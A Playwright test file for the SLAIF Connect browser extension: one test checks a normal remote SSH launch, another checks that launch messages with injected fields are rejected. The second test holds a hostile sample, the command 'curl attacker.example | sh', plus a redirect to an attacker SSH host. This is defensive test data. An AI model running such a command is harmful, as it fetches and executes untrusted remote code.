import {expect, test} from '@playwright/test';
import {launchSlaifExtensionContext} from './fixtures/extensionContext.mjs';
import {
  startBrowserRelayDevStack,
  stopBrowserRelayDevStack,
} from './helpers/devStack.mjs';
import {
  enterDevPasswordWhenPrompted,
  expectRemoteOutput,
  launchFromMockSlaifPage,
  sendExternalLaunchMessage,
} from './helpers/extensionPage.mjs';

test.describe('SLAIF Connect web launch session flow', () => {
  test('runs browser-side OpenSSH/WASM from an external SLAIF launch message', async () => {
    const stack = await startBrowserRelayDevStack();
    let extensionHarness = null;

    try {
      extensionHarness = await launchSlaifExtensionContext({
        headless: process.env.SLAIF_BROWSER_HEADED !== '1',
      });

      const {sessionPage} = await launchFromMockSlaifPage(
          extensionHarness,
          stack.launcherUrl,
      );

      await expect(sessionPage.locator('body')).toContainText('Relay connected', {timeout: 90000});
      await enterDevPasswordWhenPrompted(sessionPage, stack.password);
      await expectRemoteOutput(sessionPage, stack.expectedOutput);
      await expect(sessionPage.locator('body')).toHaveAttribute('data-slaif-status', 'completed', {
        timeout: 120000,
      });
    } finally {
      if (extensionHarness) {
        await extensionHarness.close();
      }
      await stopBrowserRelayDevStack(stack);
    }
  });

  test('rejects web launch messages with forbidden SSH target fields', async () => {
    const stack = await startBrowserRelayDevStack();
    let extensionHarness = null;

    try {
      extensionHarness = await launchSlaifExtensionContext({
        headless: process.env.SLAIF_BROWSER_HEADED !== '1',
      });
      const launcher = await extensionHarness.context.newPage();
      const url = new URL(stack.launcherUrl);
      url.searchParams.set('extensionId', extensionHarness.extensionId);
      await launcher.goto(url.href);

      const maliciousHost = await sendExternalLaunchMessage(launcher, extensionHarness.extensionId, {
        type: 'slaif.startSession',
        version: 1,
        hpc: stack.runtimeConfig.hpc,
        payloadId: stack.runtimeConfig.payloadId,
        sessionId: stack.runtimeConfig.sessionId,
        launchToken: stack.launchToken,
        sshHost: 'attacker.example',
        sshPort: 22,
      });
      expect(maliciousHost.ok).toBe(false);
      expect(maliciousHost.error).toContain('sshHost');

      const maliciousCommand = await sendExternalLaunchMessage(launcher, extensionHarness.extensionId, {
        type: 'slaif.startSession',
        version: 1,
        hpc: stack.runtimeConfig.hpc,
        payloadId: stack.runtimeConfig.payloadId,
        sessionId: stack.runtimeConfig.sessionId,
        launchToken: stack.launchToken,
        command: 'curl attacker.example | sh',
      });
      expect(maliciousCommand.ok).toBe(false);
      expect(maliciousCommand.error).toContain('command');

      const pages = extensionHarness.context.pages()
          .filter((page) => page.url().includes('/html/session.html'));
      expect(pages).toHaveLength(0);
    } finally {
      if (extensionHarness) {
        await extensionHarness.close();
      }
      await stopBrowserRelayDevStack(stack);
    }
  });
});
